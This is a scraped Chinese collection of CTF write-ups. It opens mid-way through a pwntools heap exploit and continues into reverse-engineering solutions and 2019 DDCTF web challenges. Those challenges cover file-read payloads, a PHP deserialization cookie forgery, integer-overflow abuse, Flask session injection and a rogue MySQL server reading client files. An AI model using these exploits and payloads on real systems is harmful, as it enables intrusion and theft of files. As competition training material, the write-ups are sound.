delete(index): p.recvuntil('> ') p.sendline('4') p.sendline(str(index)) add(0x50*'s'+'\\n') add(0x60*'s'+'\\n') add(0x60*'s'+'\\n') add(0x60*'b'+'\\n') delete(1) delete(3) delete(2) add(p64(0x4040bd).ljust(0x60,'c')+'\\n') add(0x60*'n'+'\\n') add(0x60*'m'+'\\n') payload = 'd'*3 + p64(0x4040e0) + p64(0x4040f0) + p32(0) + p32(20) + p64(elf.got['read'])+p64(0x4040f0) add((0x60*'\\x00')+'\\n') edit(0,payload+'\\n') show(0) readaddr = u64(p.recv(6).ljust(8,'\\x00')) libcaddr = readaddr - libc.symbols['read'] print \"libc---->\",hex(libcaddr) edit(0,p64(libcaddr + 0x4526a)+'\\n') p.sendline('icqf3f12bdf6e59569e295aacbd704b2') p.interactive() Reverse 作者：lizhirui、impakho bbvvmm 一道考察虚拟机和加密算法的逆向题。大致流程如下。 输入用户名和密码，用户名和密码会被分开校验。 用户名为 8字节 长度，先被 bin2hex 处理变成 16字节 长度。 sm4_keyext 进行密钥扩展，与处理后的用户名一起参与 sm4 加密。 加密结果进行 bin2hex 处理，再进行一个被修改过编码表的 base64 编码，最后比较 base64 的内容。 结合网上的代码进行修改，写出这部分的解密代码，得到用户名：badrer12。 import string base64_charset = 'IJLMNOPKABDEFGHCQRTUVWXSYZbcdefa45789+/6ghjklmnioprstuvqwxz0123y' def b64encode(origin_bytes): base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes] resp = '' nums = len(base64_bytes) // 3 remain = len(base64_bytes) % 3 integral_part = base64_bytes[0:3 * nums] while integral_part: tmp_unit = ''.join(integral_part[0:3]) tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]] resp += ''.join([base64_charset[i] for i in tmp_unit]) integral_part = integral_part[3:] if remain: remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8 tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1] resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '=' return resp def b64decode(base64_str): base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if s != '='] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: tmp_unit = ''.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = ''.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return resp Sbox = [ [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05], [0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99], [0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62], [0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6], [0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8], [0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35], [0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87], [0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E], [0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1], [0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3], [0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F], [0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51], [0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8], [0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0], [0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84], [0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] ] CK = [ 0x00070e15L, 0x1c232a31L, 0x383f464dL, 0x545b6269L, 0x70777e85L, 0x8c939aa1L, 0xa8afb6bdL, 0xc4cbd2d9L, 0xe0e7eef5L, 0xfc030a11L, 0x181f262dL, 0x343b4249L, 0x50575e65L, 0x6c737a81L, 0x888f969dL, 0xa4abb2b9L, 0xc0c7ced5L, 0xdce3eaf1L, 0xf8ff060dL, 0x141b2229L, 0x30373e45L, 0x4c535a61L, 0x686f767dL, 0x848b9299L, 0xa0a7aeb5L, 0xbcc3cad1L, 0xd8dfe6edL, 0xf4fb0209L, 0x10171e25L, 0x2c333a41L, 0x484f565dL, 0x646b7279L ] FK = [0xA3B1BAC6L, 0x56AA3350L, 0x677D9197L, 0xB27022DCL] def LeftRot(n, b): return (n > 32 - b) & 0xffffffff def t(a): a4=a>>4 a3=a4>>4 a2=a3>>8 a1=a2>>8 return (Sbox[a1>>4][a1&0xf] >4&0xf][a2&0xf] >4&0xf][a3&0xf] > (128-32),(m >> (128-32*2))&0xffffffff,(m >> 32)&0xffffffff,m&0xffffffff] Y=[lbc(key >> (128-32)),lbc((key >> (128-32*2))&0xffffffff),lbc((key >> 32)&0xffffffff),lbc(key&0xffffffff)][::-1] K=[Y[i]^FK[i] for i in xrange(4)] for i in xrange(32): K.append(K[i]^T_(K[i+1]^K[i+2]^K[i+3]^CK[i])) X=sm4(X,K,1) username='' for i in xrange(4): username += hex(X[i])[2:-1].decode('hex').decode('hex') print username 除了已经得到的用户名，还需要得到密码才能登录进去拿到 Flag。 这里要求输入 6 字节的密码，然后放到 ptr + 4 (i + 0x24LL) 处。而这个 ptr 是在初始化虚拟机的时候定义的。虚拟机运行完毕，`((_DWORD *)ptr + 0x19)` 要等于 0。 现在开始分析这个虚拟机的构造。 这里初始化了虚拟寄存器，基于物理堆实现的虚拟栈，虚拟机指令及其对应的处理函数，虚拟指令表等。 这是虚拟机运行时，需要执行的虚拟指令表。 这是一条执行虚拟机指令表的循环语句，结束标志为 0xFF。刚好对应上虚拟指令表最后一个指令。 到这里就需要启动 人肉虚拟机指令翻译器，它能够结合指令处理函数和指令表，将每一条指令翻译成伪汇编语句。 B0 19 00 00 00: push 0x19 B5 0A: pop r6 B2 0B: push r7 B4 09: pop ptr[r6] B0 1A 00 00 00: push 0x1A B5 0A: pop r6 04 0B 09: r7=ptr[r6] B0 1A 00 00 00: push 0x1A B5 0A: pop r6 B2 0B: push r7 B4 09: pop ptr[r6] 90 C2 00 00 00: jmp 0xC2 91: jmp next 01 1A 00 00 00 0A: r6=0x1A 02 09 00: r1=ptr[r6] 10 09 30 00 00 00 01: r2=&ptr[0x30] B2 01: push r2 B2 00: push r1 C0: *(s0r-1)+=*(s0r-2) B5 00: pop r1 B0 F4 FF FF FF: push 0xFFFFFFF4 B5 0A: pop r6 B1 00: push r1[r6] B5 01: pop r2 01 1A 00 00 00 0A: r6=0x1A B1 09: push ptr[r6] B5 00: pop r1 10 00 78 00 00 00 00: r1+=0x78 70 00 FF 00 00 00 00: r1&=0xFF 50 00 18 00 00 00 00: r1>*(s0r-1) B5 00: pop r1 B2 01: push r2 B2 00: push r1 C3: *(s0r-1)^=*(s0r-2) B5 00: pop r1 50 00 18 00 00 00 00: r1>*(s0r-1) B5 00: pop r1 70 00 FF 00 00 00 01: r2=0xFF&r1 01 19 00 00 00 0A: r6=0x19 02 09 00: r1=ptr[r6] 11 01 00 00: r1+=r2 B0 19 00 00 00: push 0x19 B5 0A: pop r6 B2 00: push r1 B4 09: pop ptr[r6] 01 1A 00 00 00 0A: r6=0x1A B1 09: push ptr[r6] B5 00: pop r1 10 00 01 00 00 00 00: r1+=0x01 01 1A 00 00 00 0A: r6=0x1A 04 00 09: ptr[r6]=r1 B0 1A 00 00 00: push 0x1A B5 0A: pop r6 02 09 00: r1=ptr[r6] 86 00 06 00 00 00 00: r1=r1不过这样还是有点难看懂，那不妨将 `人肉虚拟机指令翻译器`` 的功率调大，让它输出更加美妙而神奇的代码。 ptr_0x1A=0 password='******' for i in range(0x06): ptr_0x1A+=ord(password[i])^(0x78+i) 这样的代码具有很强的艺术观赏性。怀着美好的心情，掐指一算密码就是 xyz{|}。 借助 自然之力 登录进去，顺利拿到 pizza大佬 留下的丰厚宝藏：pizza's原味flag 一枚。 from pwn import * io=remote('39.106.224.151', 10001) io.send('badrer12\\n') io.send('xyz{|}') io.interactive() Flag: flag{eafd_134g_vp1d_vsdr_v5yg_ai0g_fsdg_g24t_sdfg} easygo 根据题目名称和 IDA 结合来看，猜测是一个 go 写的程序。 程序的符号信息被去除了，用 IDAGolangHelper 恢复符号信息。 然后看main_main 函数，在encoding_base64__ptr_Encoding_DecodeString 处下断点。 单步调试到这里，跟进 rsi 地址的内存数据，就能看到 flag 了。 Flag: flag{92094daf-33c9-431e-a85a-8bfbd5df98ad} strange_int 篇幅问题，请移步：https://www.52pojie.cn/thread-936377-1-1.html 评论区 请文明评论，禁止广告 "},"articals/2019ddctf.html":{"url":"articals/2019ddctf.html","title":"2019DDCTF","keywords":"","body":"2019DDCTF滴滴高校闯关赛 本题已开通评论，欢迎在页面最下方留言吐槽。 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 链接: https://pan.baidu.com/s/16CV9YL5maNYIi-TbXzMWHg 提取码: tdbs 网上公开WP： https://xz.aliyun.com/t/4862 https://xz.aliyun.com/t/4849 https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&mid=2651905380&idx=1&sn=2d85c96fe650fb625b53fbf8536ee0f5&chksm=84e34ee1b394c7f7d6d9302d5ebe0be50b1444b02a3b7f250f3898040618a9525532ba23f854&mpshare=1&scene=23&srcid=#rd http://cdusec.happyhacking.top/?post=49 https://www.zhaoj.in/read-5269.html http://12end.xyz/ddctf-writeup/ http://yuufeng.com/ https://blog.csdn.net/m0_37809075/article/details/89280350 https://www.xmsec.cc/p/4891b1d2-1166-4553-951c-d46cbac95af3/ http://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485730&idx=1&sn=cb90f178c56453f558acc626ec84ddad&chksm=e89e21fadfe9a8ecca8ac397984045c7ebda97577ac082d94141d37d0b12d70222128f0af2e7&mpshare=1&scene=23&srcid=#rd 本站备份WP： 感谢作者：evoA、5am3、Glzjin、12end、admin-琴里、Yunen WEB 滴~ 本题作者：Yunen 题目地址：http://117.51.150.246/打开题目：发现页面进行了一次调整，跳转后的url：http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09猜测jpg参数的值为base64编码后的内容，解码内容如下：NjY2QzYxNjcyRTZBNzA2Nw==明显的base64编码，再进行一次解码：666C61672E6A7067观察数据，发现两两一组时，字母全在数字后，且范围在[A-F]之内，猜测为HEX，将其转换为Ascii试试：flag.jpg明显的任意文件读取漏洞，尝试读取index.php将index.php其转换成HEX，再两次转Base64得：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3替换原来的jpg值访问：红框部分即为index.php的base64编码过的内容，复制下来解码得： '.$_GET['jpg'].''; $file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file); echo $file.''; $file = str_replace(\"config\",\"!\", $file); echo $file.''; $txt = base64_encode(file_get_contents($file)); echo \"\"; /* * Can you find the flag file? * */ ?> 题目提示了一个url，还有一个日期(2018-7-4)。 打开提示文章，发现该文章发表时间与提示时间不同。打开作者首页，找到2018-7-4发表的文章：https://blog.csdn.net/FengBanLiuYun/article/details/80913909这里有个巨大脑洞！！写这题的时候真想杀了出题人猜测存在备份文件practice.txt.swp，访问之~:提示flag存在于f1ag!ddctf.php文件，使用index.php读取之~由于$file = preg_replace(\"/[^a-zA-Z0-9.]+/\",\"\", $file);，我们无法直接输入!不过由于$file = str_replace(\"config\",\"!\", $file);，我们可以使用config来代替。故payload为:117.51.150.246/index.php?jpg=TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==返回内容base64解码： 简单的变量覆盖题，extract($_GET);会将GET内容转换成变量。file_get_contents($k)使用php://input将会返回post的数据getflag:flag: DDCTF{436f6e6772617******174696f6e73} Web签到题 打开题目，提示不是管理员权限，观察请求header，发现字段：didictf_username的值为空burp拦截数据包修改为admin，返回内容：您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php访问app/fL2XID2i0Cdh.php得源码： url:app/Application.php Class Application { var $path = ''; public function response($data, $errMsg = 'success') { $ret = ['errMsg' => $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { $DIDICTF_ADMIN = 'admin'; if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) { $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'); return TRUE; }else{ $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error'); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { if(empty($this->path)) { exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } url:app/Session.php include 'Application.php'; class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = file_get_contents('../config/key.txt'); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { parent::response('the ip addree not match'.'error'); return FALSE; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index(); 这里我才有回溯的方法，先确定flag可能的输出点在构造满足条件的payload。在private function get_key()函数里提示到flag与eanccrykey在同一个文件夹，猜测flag内容在../config/flag.txt里。通读代码，可以发现唯一可能的flag输出点在public function __destruct()，这是Application类的析构函数，退出时会自动执行里边的代码，结合下边的serialize与unserialize易知此题考的是php反序列化。而我们发现，如果我们直接对cookie进行修改是不行，这是因为服务端使用key进行了加密验证处理，如果我们能拿到key的内容，那么变可以轻易绕过。 if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } 我们注意到此处函数涉及到key值的操作，其中sprintf为占位符替换函数。如果我们post的nickname值里存在%s 那么key值也会随着输出。先获得cookie值，记得header头加上didictf_username: admin将cookie替换，post内容:nickname=a---%s得到key:EzblrbNS，至此大工告成。理清下思路： 1.新建Application类，修改path变量为..././config/flag.txt(../进行过一次过滤) 2.将类加入$userdata数组进行序列化处理 3.返回key加密后的cookie 4.getflag 本地搭建php环境： 将以下源码复制访问 即可生成序列化数据： $errMsg, 'data' => $data]; $ret = json_encode($ret); header('Content-type: application/json'); echo $ret; } public function auth() { return true; } private function sanitizepath($path) { $path = trim($path); $path=str_replace('../','',$path); $path=str_replace('..\\\\','',$path); return $path; } public function __destruct() { $this->response($this->user_agent); if(empty($this->path)) { $this->response(\"error111\"); exit(); }else{ $path = $this->sanitizepath($this->path); if(strlen($path) !== 18) { exit(); } $this->response($data=file_get_contents($path),'Congratulations'); } exit(); } } class Session extends Application { //key建议为8位字符串 var $eancrykey = ''; var $cookie_expiration = 7200; var $cookie_name = 'ddctf_id'; var $cookie_path = ''; var $cookie_domain = ''; var $cookie_secure = FALSE; var $activity = \"DiDiCTF\"; public function index() { if(parent::auth()) { $this->get_key(); if($this->session_read()) { $data = 'DiDI Welcome you %s'; $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']); parent::response($data,'sucess'); }else{ $this->session_create(); $data = 'DiDI Welcome you'; parent::response($data,'sucess'); } } } private function get_key() { //eancrykey and flag under the folder $this->eancrykey = 'EzblrbNS'; } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this->cookie_name]; if(!isset($session)) { parent::response(\"session not found\",'error'); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this->eancrykey.$session)) { parent::response(\"the cookie data not match\",'error'); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){ return FALSE; } if(!empty($_POST[\"nickname\"])) { $arr = array($_POST[\"nickname\"],$this->eancrykey); $data = \"Welcome my friend %s\"; foreach ($arr as $k => $v) { $data = sprintf($data,$v); } parent::response($data,\"Welcome\"); } if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) { return true; } if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) { parent::response('the user agent not match','error'); return FALSE; } return TRUE; } private function session_create() { $sessionid = ''; while(strlen($sessionid) path = '..././config/flag.txt'; //修改类中变量path $userdata = array( $a, //序列化 'session_id' => md5(uniqid($sessionid,TRUE)), 'ip_address' => $_SERVER['REMOTE_ADDR'], 'user_agent' => $_SERVER['HTTP_USER_AGENT'], 'user_data' => '', ); $cookiedata = serialize($userdata); parent::response($cookiedata); $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata); $expire = $this->cookie_expiration + time(); setcookie( $this->cookie_name, $cookiedata, $expire, $this->cookie_path, $this->cookie_domain, $this->cookie_secure ); } } $ddctf = new Session(); $ddctf->index();?> 生成数据： a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";} 注意此处的数据由于UA头不同，请自己生成。记得加上key进行md5加密： import hashlib str = 'EzblrbNS'+'a:5:{i:0;O:11:\"Application\":1:{s:4:\"path\";s:21:\"..././config/flag.txt\";}s:10:\"session_id\";s:32:\"d31fd78332ef2737d3c007915d643d86\";s:10:\"ip_address\";s:13:\"192.168.246.1\";s:10:\"user_agent\";s:115:\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36\";s:9:\"user_data\";s:0:\"\";}' print(hashlib.md5(str.encode('utf8')).hexdigest()) 得到hash:3c27da16d59c7edbacbf41a5cea391c3修改数据包重放：记得先url编码哟~flag: DCTF{ddctf2019_*****_pHVlHIDDGdV8qA2j} UploadIMG 作者：Glzjin 知识点：PHP-GD 二次渲染绕过 步骤： 1、用上面给出的用户名密码打开靶机，发现是这么一个页面。2、那么就传一个图片上去试试吧。3、上传之后，发现提示 “[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()”，并且还返回了上传之后图片的地址。4、那么我们就把我们上传之后的图片下载回来看看吧。下载之后用 hex 编辑器打开。发现开头这儿指明了其是 php-gd 带着 libjpeg 转换的。5、比较一下原图片和现在的图片，似乎有很多不同。6、那么我们把下载下来的图片再传回去呢？7、啊哈，这一把前面倒是蛮多相同的地方了。8、那么我们就往里面相同的部分替换 “phpinfo()” (9字节)试试。9、不断 fuzz 插入的位置，发现插入这里可以。10、Flag 到手~ 大吉大利，今晚吃鸡~ 本文作者：12end进去注册，登录后只有100金币，但是吃鸡的ticket需要2000金币，需要想办法绕过去。 购买ticket 截取添加订单的请求，发现是一个简单的get请求，且ticket_price是可控的：经尝试发现，这个tickiet_price只可以修改地比2000大，且只能含有数字，那么我们只能考虑整数溢出了。在32位系统下，所有无符号整数的数量是2^32=4294967296，去掉0这个数的话，最大整数便是4294967295，当我们令一个数等于2^32时，它便会溢出为0。我们这里传入4294967297,虽然订单页面显示的还是如此，但实际支付订单时，它才产生了溢出，初步认为他是以字符串存入，在运算时再转换为整型（可能并不准确），最后只花了1金币购买：进到游戏之后，可以通过提交正确id与ticket来移除对手，没什么好办法，经过一番尝试了解到id与ticket是固定对应的关系，只有写脚本通过暴力注册获取尽可能多的id，然后一一删除了。 tips:剩余对手的100人中，id是任意的，你并不能保证只需要注册100次就可以删掉全部的对手，最有效的办法是注册一次删除一次。 因篇幅原因，抓取api请求，并编写脚本的过程便不再赘述，脚本注释已较为详尽，使用时修改参数即可，唯一缺憾是代码健壮性欠佳，遇到网络问题时不能处理错误造成崩溃，但代码作用是可续的，所以问题不大，重启脚本就可以继续了 import requests import time regist = \"http://117.51.147.155:5050/ctf/api/register?password=11111111&name=\"#name添加一个前缀 buy_ticket = \"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\" pay_ticket = \"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\" delete = \"http://117.51.147.155:5050/ctf/api/remove_robot\" get_flag=\"http://117.51.147.155:5050/ctf/api/get_flag\" i= 55555 #初始化用户名,使用未注册过的数字 def delete_robot(player_id, player_ticket): COOKIE = {\"Cookie\": \"user_name=; REVEL_SESSION=\"} #修改为自己主账户的cookie param={\"id\":player_id,\"ticket\":player_ticket} requests.get(delete,params=param, headers=COOKIE) #删除id flag = requests.get(get_flag, headers=COOKIE) #获取剩余的敌人数量 print(flag.text ) while True: t = requests.session() i+=1 r = t.get(regist + str(i)) #注册 r = t.get(buy_ticket).json() #购买Ticket，解析json bill_id = r[\"data\"][0][\"bill_id\"] #json解析bill_id r = t.get(pay_ticket + bill_id).json() #支付订单 player_id = r[\"data\"][0][\"your_id\"] player_ticket = r[\"data\"][0][\"your_ticket\"] #json解析id与ticket delete_robot(player_id,player_ticket) #使用主账户删除id time.sleep(0.3) #短暂休眠避免被封 homebrew event loop 作者：12end直接审计源码对于本题的字串切割函数get_mid_str请自行理解，如果不明白这个函数的话，下面的payload将难以理解原理。首先，eval的那部分由于分割不当可以通过注释符导致代码执行，我们可以构造?action:show_flag_function%23;请求来执行一个（没卵用的函数）:能够执行，就该思考怎么进一步利用以获取flag不难看出，本题靠队列控制函数的执行流程，且唯一获取flag的函数被ban掉了返回值: def show_flag_function(args): #被ban的输出flag函数，没有return flag flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return 'You naughty boy! ;) ' 仔细观察代码，我们发现还可以从两个地方获取flag： 1.直接执行FLAG() 2.执行get_flag_handler会通过trigger_event('func:show_flag;' + FLAG())将flag的值入队 我最开始想到的方法便是直接执行FLAG()，在flask中，视图函数的返回值会被传输到前端以供展示，这道题的视图函数entry_point的返回值是execute_event_loop(),而execute_event_loop的返回值resp是由事件循环中执行函数的返回值ret_val决定的，这也就是我们直接执行show_flag_function函数会将返回值打印在前端的原因。以此推出，如果能直接执行FLAG()，flag也会被打印出来。到此为止似乎一帆风顺，我们把上面的请求稍作修改不就可以拿flag了吗？实际测试却404了。 404的原因在这里： try: event_handler = eval(action + ('_handler' if is_action else '_function')) #eval造成的代码执行，从这里下手 ret_val = event_handler(args) #获取返回值 可以看到第三行的执行函数是带有参数的，而我们试图向一个不需要参数的函数传参时，python会抛出参数过多的错误，try失败后就会导致404。思考了很久也没有想出能够绕过这里的地方，如果绕过去了，这应当是一个非预期解。 经@Smi1e师傅的指导，知道这道题要利用flask的客户端session导致的安全问题。相关文章：客户端 session 导致的安全问题好巧不巧，题中的执行队列恰巧是存储在session中的。那么，我们只需要利用上面提到的第二点来将flag值入队，解密此时的session即可。payload:?action:trigger_event%23;action:buy;5%23action:get_flag; mysql弱口令 作者：12end提示先部署agent.py再进行弱口令扫描 在agent.py的响应函数中，返回了result的响应内容，result的值来源于_func函数： class RequestHandler(BaseHTTPRequestHandler): def do_GET(self): .... ... result = self._func() self.wfile.write(json.dumps(result)) 研究一下_func()： def _func(self): netstat = Popen(['netstat', '-tlnp'], stdout=PIPE) //执行netstat子进程，获取在监听的tcp服务程序名等信息并输入至pipe netstat.wait() //等待子进程结束 ps_list = netstat.stdout.readlines() //逐行读取 result = [] for item in ps_list[2:]: tmp = item.split() Local_Address = tmp[3] Process_name = tmp[6] tmp_dic = { 'local_address': Local_Address, 'Process_name': Process_name } result.append(tmp_dic) //向result中增加字典元素，包含着进程的源地址及进程名称 return result 可以看出整个程序的作用就是返回tcp服务进程的相关信息，猜测题目的服务器（下称靶机）是以此判断mysql是否在目标服务器（下称客户机）上运行。 尝试一番，当我们未在客户机上运行agent.py时，会提示： 而此时，我们客户机的Mysql是开启着的。 同样，将客户机的Mysql关闭，agent.py运行，会提示未扫描到弱密码。mysql的进程名称是mysqld，我们直接修改self.wfile.write(json.dumps(result))为mysqld可以成功绕过服务器的判断。 绕过了，然后呢？祭出我@Smi1e师傅的一篇blog：MySQL LOAD DATA 读取客户端任意文件 如何利用MySQL LOCAL INFILE读取客户端文件 大意是指,主机A连接远程mysql服务器主机B的过程中，所有请求都是明文传输，而我们可以在主机B上伪造任意内容发送给主机A。 而在MySQL中，LOAD DATA LOCAL INFLIE语句会将本地内容传输给远端服务器，下面是执行LOAD DATA LOCAT INFILE的过程： 本地向远端服务器发起请求包，请求包含要传输的文件路径-> 远端服务器对请求进行响应，响应内容为请求包中的文件路径-> 本地发送响应包中的文件内容 如果我们可以伪造响应的任意内容，也就意味着能够读取到连接者本地的任意文件 最重要的是伪造的服务端可以在任何时候回复一个file-transfer 请求，不一定非要是在客户端发送LOAD DATA LOCAL数据包的时候。（前提是客户端已经请求了任意内容，幸运的时，绝大多数客户端都会在连接mysql成功时发送一系列类似@@version的初始化请求） 不过如果想要利用此特性，客户端必须具有CLIENT_LOCAL_FILES即(Can use LOAD DATA LOCAL)属性。如果没有的话，就要在连接mysql的时候加上--enable-local-infile。 回归正题，为了与靶机建立连接，我们就需要让靶机认为已经连接上了我们的数据库，我们只需向其响应greeting以及authok的数据包即可，然后再发送精心构造好的数据包，让靶机把我们想要的文件给响应过来在github上已有相关的项目以部署这样的恶意mysql服务器：Rogue-MySql-Server在这里以python的脚本为例： 修改26行的filelist为我们想要读取的文件路径，假设为’/etc/passwd’，先开启agent.py欺骗靶机，告诉它我们已经开启了mysqld进程，再开启这个poc.py，然后让靶机扫描一下我们的客户机： 最后的文件信息会在当前目录下的mysql.log：root用户的mysql操作一般记录在：~/.mysql_history中，读取一下就可以拿到flag 欢迎报名DDCTF 